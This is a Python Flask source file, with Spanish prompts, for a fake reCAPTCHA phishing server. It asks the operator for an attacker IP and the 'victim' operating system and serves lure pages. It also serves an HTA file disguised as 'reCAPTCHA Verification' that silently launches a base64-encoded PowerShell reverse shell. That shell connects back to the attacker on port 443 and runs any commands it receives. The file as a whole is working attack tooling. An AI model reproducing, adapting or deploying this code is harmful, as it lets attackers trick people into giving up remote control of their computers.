
from flask import Flask, Response, render_template
import base64
import socket
import os

app = Flask(__name__)
IP_FILE = "selected_ip.txt"
OS_FILE = "victim_os.txt"

def get_local_ips():
    ip_list = []
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if not ip.startswith("127."):
            ip_list.append(ip)
    except:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        if local_ip not in ip_list:
            ip_list.append(local_ip)
        s.close()
    except:
        pass
    if not ip_list:
        ip_list.append("127.0.0.1")
    return ip_list

def get_or_select_ip():
    if os.path.exists(IP_FILE):
        with open(IP_FILE, "r") as f:
            return f.read().strip()
    else:
        ip_options = get_local_ips()
        print("=== Selección de IP para LHOST ===")
        for i, ip in enumerate(ip_options):
            print(f"[{i}] {ip}")
        try:
            selected = int(input("Selecciona el número de IP a usar como LHOST: "))
            ip = ip_options[selected]
        except:
            print("Selección inválida, usando la primera IP por defecto.")
            ip = ip_options[0]
        with open(IP_FILE, "w") as f:
            f.write(ip)
        return ip

def get_or_select_victim_os():
    if os.path.exists(OS_FILE):
        with open(OS_FILE, "r") as f:
            return f.read().strip().lower()
    else:
        print("=== ¿Sistema operativo de la víctima? ===")
        print("[1] Windows")
        print("[2] Linux")
        choice = input("Selecciona 1 o 2: ")
        if choice == "2":
            victim_os = "linux"
        else:
            victim_os = "windows"
        with open(OS_FILE, "w") as f:
            f.write(victim_os)
        return victim_os

LHOST = get_or_select_ip()
VICTIM_OS = get_or_select_victim_os()
print(f"✔️ IP seleccionada: {LHOST}")
print(f"✔️ Sistema de la víctima: {VICTIM_OS.capitalize()}")


def generate_hta_payload(LHOST):
    powershell_command = f'''
$LHOST = "{LHOST}"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
    '''.strip()
    encoded = base64.b64encode(powershell_command.encode("utf-16le")).decode("utf-8")
    hta = f'''
<html>
<head>
  <HTA:APPLICATION
    APPLICATIONNAME="reCAPTCHA Verification"
    BORDER="thin"
    BORDERSTYLE="normal"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
  />
  <script language="VBScript">
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -nop -w hidden -EncodedCommand {encoded}", 0, false
    window.close
  </script>
</head>
<body></body>
</html>
    '''
    return Response(hta, mimetype='application/hta')


@app.route('/')
def index():
    if VICTIM_OS == "linux":
        return render_template("index-linux.html", shell_command=LHOST)
    else:
        return render_template("index-windows.html", shell_command=LHOST)
    
@app.route('/recaptcha-verify')
def serve_hta():
    return generate_hta_payload(LHOST)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
